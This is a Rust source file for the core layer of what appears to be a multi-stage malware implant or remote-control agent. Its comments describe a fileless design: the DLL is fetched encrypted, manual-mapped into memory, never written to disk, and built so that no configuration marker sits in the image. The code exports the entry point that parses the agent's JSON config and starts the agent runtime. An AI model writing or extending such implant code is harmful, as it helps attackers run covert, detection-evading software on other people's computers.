// The core DLL (third layer): the full agent runtime, never written to disk —
// it is fetched encrypted, manual-mapped and entered through this export. The
// payload config arrives as JSON from the encrypted DLL tail (see the loader),
// so this crate builds without the `embedded-slot` feature: no WISPCFG marker
// ships inside the image.
use wisp_agent_rs as agent;

// Entry contract with the loader:
//   agent_entry(cfg_ptr, cfg_len, image_base) -> process exit code
// Blocks for the agent's lifetime; the loader converts the return into
// ExitProcess because the stager process is just the core's host.
#[no_mangle]
pub extern "system" fn agent_entry(cfg_ptr: *const u8, cfg_len: usize, _base: usize) -> u32 {
    if cfg_ptr.is_null() || cfg_len == 0 {
        return 1;
    }
    let json = unsafe { std::slice::from_raw_parts(cfg_ptr, cfg_len) };
    let mut cfg: agent::config::Config = match serde_json::from_slice(json) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("core: bad config: {e}");
            return 2;
        }
    };
    if let Err(e) = cfg.finalize() {
        eprintln!("core: {e}");
        return 3;
    }
    agent::run(cfg);
    0
}